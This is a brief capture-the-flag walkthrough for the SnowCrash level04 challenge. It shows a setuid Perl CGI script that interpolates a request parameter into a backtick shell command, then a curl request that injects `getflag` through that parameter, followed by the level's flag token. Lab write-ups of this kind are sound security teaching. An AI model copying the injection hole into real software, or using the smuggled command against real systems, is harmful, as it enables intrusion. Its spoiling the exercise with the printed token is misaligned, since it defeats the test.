
```sh
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html
```

```sh
level04@SnowCrash:~$ cat level04.pl 
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
```

```sh
x(param("x"));
level04@SnowCrash:~$
level04@SnowCrash:~$
level04@SnowCrash:~$ curl localhost:4747 -d 'x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```